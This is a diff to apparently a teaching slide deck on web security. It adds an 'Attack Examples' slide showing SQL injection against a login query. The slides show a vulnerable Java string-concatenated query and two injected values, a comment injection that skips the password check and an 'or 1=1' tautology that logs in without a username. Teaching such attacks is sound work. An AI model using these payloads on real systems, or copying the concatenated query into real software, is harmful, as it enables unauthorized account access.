@@ -96,17 +96,31 @@
                 </section>
 
                 <section>
-                    <h3>Bypassing Authentication</h3>
-                    <h5>with SQL Injection</h5>
-                    <pre><code data-trim>
+                    <section>
+                        <h3>Bypassing Authentication</h3>
+                        <h5>with SQL Injection</h5>
+                        <pre><code data-trim>
 String query = "SELECT id FROM users " +
                "WHERE name = '" + req.getParameter("username") + "'" +
                "AND password = '" + req.getParameter("password") + "'";
-                    </code></pre>
-                    <p>The indented use case results in a query like this:</p>
-                    <pre><code data-trim contenteditable>
+                        </code></pre>
+                        <p>The indented use case results in a query like this:</p>
+                        <pre><code data-trim contenteditable>
 SELECT id FROM users WHERE name = 'bjoern' AND password = 'secret'
-                    </code></pre>
+                        </code></pre>
+                    </section>
+                    <section>
+                        <h3>Attack Examples</h3>
+                        <h5>on authentication queries</h5>
+                        <p>Disabling password check for a known username:</p>
+                        <pre><code data-trim contenteditable>
+SELECT id FROM users WHERE name = 'bjoern'--' AND password = '?'
+                        </code></pre>
+                        <p>Logging in without even knowing a username:</p>
+                        <pre><code data-trim contenteditable>
+SELECT id FROM users WHERE name = '' or 1=1--' AND password = '?'
+                        </code></pre>
+                    </section>
                 </section>
 
                 <section>
